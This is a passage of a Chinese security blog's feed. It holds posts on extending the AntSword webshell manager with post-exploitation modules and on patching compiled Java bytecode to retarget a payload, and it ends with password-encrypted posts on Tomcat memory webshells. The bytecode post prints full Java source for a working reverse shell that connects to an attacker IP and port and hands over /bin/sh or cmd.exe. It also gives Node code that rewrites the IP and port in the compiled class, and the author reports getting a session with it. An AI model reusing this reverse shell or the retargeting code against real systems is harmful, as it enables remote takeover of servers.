class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">const Base = require(&quot;../base&quot;);</span><br><span class="line">class Test extends Base &#123;</span><br><span class="line">  createForm(cell) &#123;</span><br><span class="line">    var str = [</span><br><span class="line">      &#123;</span><br><span class="line">        type: &quot;input&quot;,</span><br><span class="line">        name: &quot;test_command&quot;,</span><br><span class="line">        label: &quot;执行命令&quot;,</span><br><span class="line">        labelWidth: 150,</span><br><span class="line">        labelAlign:&quot;center&quot;,</span><br><span class="line">        inputWidth: 200,</span><br><span class="line">      &#125;,</span><br><span class="line">    ];</span><br><span class="line">    var form = cell.attachForm(str);</span><br><span class="line">    this.form = form;</span><br><span class="line">  &#125;</span><br><span class="line">  getArgs() &#123;</span><br><span class="line">    let args = &#123;&#125;;</span><br><span class="line">    this.payloadtype = &quot;default&quot;;</span><br><span class="line">    args[&quot;test_command&quot;] = this.form.getItemValue(&quot;test_command&quot;);</span><br><span class="line">    return args;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">module.exports = Test;</span><br></pre></td></tr></table></figure><h4 id="image-png运行结果"><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606809440392-6af21d42-c2fd-40da-8fbc-8102aeaf71e5.png" alt="image.png">运行结果</h4><p>重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606809315985-edb6e847-e668-4af6-9e47-4495f71a3d28.png" alt="image.png"></p><h2 id="最后">最后</h2><p>目前payload主要来自冰蝎跟哥斯拉，向前辈们致敬！</p><p>框架的优势就在于看到其他同类工具的比较好的功能可以迅速白嫖。这个功能不错，下一秒就是我的了.jpg</p><p>项目地址：<a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;冰蝎跟哥斯拉都有了各自的一些后渗透模块，然而蚁剑这一块基本还是空缺，所以就萌生出来做一个蚁剑的后渗透框架插件的想法。&lt;/p&gt;&lt;p&gt;目前插件的定位是蚁
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="中国蚁剑" scheme="https://yzddmr6.tk/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>无java环境修改字节码</title>
    <link href="https://yzddmr6.tk/posts/node-edit-java-class/"/>
    <id>https://yzddmr6.tk/posts/node-edit-java-class/</id>
    <published>2020-11-08T16:00:00.000Z</published>
    <updated>2020-12-01T12:40:31.293Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无java环境如何修改字节码。</p><h2 id="正文">正文</h2><h3 id="需求">需求</h3><p>在<a href="https://yzddmr6.tk/posts/antsword-diy-3/">蚁剑改造计划之实现JSP一句话</a>中，当时为了解决硬编码字节码的问题采用了额外参数的方式来传参。但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为一个特征。</p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:   ant=xxxxxxxxxxxxxxx&amp;var1=/bin/bash&amp;var2=whoami</span><br></pre></td></tr></table></figure><p>蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。</p><h3 id="Java字节码结构">Java字节码结构</h3><p>这里以As_Exploits中的jsp反弹shell的payload为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.net.Socket;</span><br><span class="line"></span><br><span class="line">public class ShellReverseTCP extends Thread &#123;</span><br><span class="line"></span><br><span class="line">    InputStream zj;</span><br><span class="line">    OutputStream sd;</span><br><span class="line">    public static String ip;</span><br><span class="line">    public static String port;</span><br><span class="line"></span><br><span class="line">    ShellReverseTCP(InputStream zj, OutputStream sd) &#123;</span><br><span class="line">        this.zj = zj;</span><br><span class="line">        this.sd = sd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public ShellReverseTCP() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public boolean equals(Object obj)&#123;</span><br><span class="line">        ip=&quot;targetIP&quot;;</span><br><span class="line">        port=&quot;targetPORT&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            RunShellReverseTCP();</span><br><span class="line">            return true;</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ip=&quot;192.168.88.129&quot;;</span><br><span class="line">        port=&quot;9999&quot;;</span><br><span class="line">        ShellReverseTCP shellReverseTCP = new ShellReverseTCP();</span><br><span class="line">        shellReverseTCP.RunShellReverseTCP();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void RunShellReverseTCP() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String ShellPath;</span><br><span class="line">            if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) &#123;</span><br><span class="line">                ShellPath = new String(&quot;/bin/sh&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ShellPath = new String(&quot;cmd.exe&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Socket socket = new Socket(ip, Integer.parseInt(port));</span><br><span class="line">            Process process = Runtime.getRuntime().exec(ShellPath);</span><br><span class="line">            (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start();</span><br><span class="line">            (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        BufferedReader yx = null;</span><br><span class="line">        BufferedWriter jah = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            yx = new BufferedReader(new InputStreamReader(this.zj));</span><br><span class="line">            jah = new BufferedWriter(new OutputStreamWriter(this.sd));</span><br><span class="line">            char buffer[] = new char[8192];</span><br><span class="line">            int length;</span><br><span class="line">            while ((length = yx.read(buffer, 0, buffer.length)) &gt; 0) &#123;</span><br><span class="line">                jah.write(buffer, 0, length);</span><br><span class="line">                jah.flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (yx != null)</span><br><span class="line">                yx.close();</span><br><span class="line">            if (jah != null)</span><br><span class="line">                jah.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。</p><p>用010editor打开编译后的字节码文件查看。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png" alt="image.png"></p><p>最开始的CAFEBABE叫做魔数，用来标志这是一个字节码文件。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png" alt="image.png"></p><p>00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp" alt="image"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png" alt="image.png"></p><p>后面还有import的相关类的信息，因为不是重点，这里不再过多说明，快进到常量池。</p><p>常量池中的每一项都是一个表，其项目类型共有14种，如下表格所示：</p><table><thead><tr><th>类型</th><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>CONSTANT_utf8_info</td><td>1</td><td>UTF-8编码的字符串</td></tr><tr><td>CONSTANT_Integer_info</td><td>3</td><td>整形字面量</td></tr><tr><td>CONSTANT_Float_info</td><td>4</td><td>浮点型字面量</td></tr><tr><td>CONSTANT_Long_info</td><td>5</td><td>长整型字面量</td></tr><tr><td>CONSTANT_Double_info</td><td>6</td><td>双精度浮点型字面量</td></tr><tr><td>CONSTANT_Class_info</td><td>7</td><td>类或接口的符号引用</td></tr><tr><td>CONSTANT_String_info</td><td>8</td><td>字符串类型字面量</td></tr><tr><td>CONSTANT_Fieldref_info</td><td>9</td><td>字段的符号引用</td></tr><tr><td>CONSTANT_Methodref_info</td><td>10</td><td>类中方法的符号引用</td></tr><tr><td>CONSTANT_InterfaceMethodref_info</td><td>11</td><td>接口中方法的符号引用</td></tr><tr><td>CONSTANT_NameAndType_info</td><td>12</td><td>字段或方法的符号引用</td></tr><tr><td>CONSTANT_MethodHandle_info</td><td>15</td><td>表示方法句柄</td></tr><tr><td>CONSTANT_MothodType_info</td><td>16</td><td>标志方法类型</td></tr><tr><td>CONSTANT_InvokeDynamic_info</td><td>18</td><td>表示一个动态方法调用点</td></tr></tbody></table><p>这14种类型的结构各不相同，如下表格所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png" alt="image">``</p><blockquote><p>注：上面的表格的单位是错的，应该是byte不是bit，不知道哪里的以讹传讹一直流传了下来。</p></blockquote><p>从上面的表格可以看到，虽然每一项的结构都各不相同，但是他们有个共同点，就是每一项的第一个字节都是一个标志位，标识这一项是哪种类型的常量。</p><p>我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。</p><p>也就是说关键的结构就是这个</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png" alt="image.png"></p><p>其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。</p><p>结合文件来看</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png" alt="image.png"></p><p>targetIP共占了8个byte，也就是16个hex的位。所以前面两个byte是00 08。然后再之前的一个byte是01，表示这是一个CONSTANT_utf8_info。</p><h3 id="如何修改">如何修改</h3><p>既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。</p><p>把yan表哥的代码抽出来修改一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function replaceClassStringVar(b64code, oldvar, newvar) &#123;</span><br><span class="line">    let code = Buffer.from(b64code, &apos;base64&apos;);//解码</span><br><span class="line">    let hexcode = code.toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let oldpos = hexcode.indexOf(hexoldvar);</span><br><span class="line">    if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串</span><br><span class="line">      let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度</span><br><span class="line">      let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容</span><br><span class="line">      return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&apos;nonono&apos;)</span><br><span class="line">    return b64code;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function decimalToHex(d, padding) &#123;</span><br><span class="line">    var hex = Number(d).toString(16);</span><br><span class="line">    padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding;</span><br><span class="line">    while (hex.length &lt; padding) &#123;</span><br><span class="line">      hex = &quot;0&quot; + hex;//小于padding长度就填充0</span><br><span class="line">    &#125;</span><br><span class="line">    return hex;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">content=`xxxxxxxxxxxxx`//要替换的字节码</span><br><span class="line"></span><br><span class="line">content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)</span><br><span class="line">content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)</span><br><span class="line">console.log(content)</span><br></pre></td></tr></table></figure><p>用命令还原一下文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n xxxxxx |baes64 -d |tee after.class</span><br></pre></td></tr></table></figure><p>看一下修改后的结果</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png" alt="image.png"></p><p>192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。</p><p>实际中是否能用呢？</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png" alt="image.png"></p><p>回车，获得会话，说明修改是有效的。</p><h2 id="最后">最后</h2><p>As_Exploits还在开发中，不得不说很麻烦，同一个功能要写asp/aspx/php/jsp四份代码。后端还可以写写，前端是真的要现学，不过还是可以期待一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>蚁剑改造计划之支持内存马</title>
    <link href="https://yzddmr6.tk/posts/antsword-diy-5/"/>
    <id>https://yzddmr6.tk/posts/antsword-diy-5/</id>
    <published>2020-09-06T01:40:57.000Z</published>
    <updated>2021-06-17T15:35:52.091Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      蚁剑改造计划之支持内存马
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存Webshell解析之Listener型</title>
    <link href="https://yzddmr6.tk/posts/tomcat-memory-webshell-listener/"/>
    <id>https://yzddmr6.tk/posts/tomcat-memory-webshell-listener/</id>
    <published>2020-08-08T13:37:22.000Z</published>
    <updated>2021-06-17T15:17:23.072Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      tomcat-memory-webshell-listener
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存Webshell解析之Filter型</title>
    <link href="https://yzddmr6.tk/posts/tomcat-memory-webshell-filter/"/>
    <id>https://yzddmr6.tk/posts/tomcat-memory-webshell-filter/</id>
    <published>2020-07-14T12:28:03.000Z</published>
    <updated>2021-06-17T15:29:25.577Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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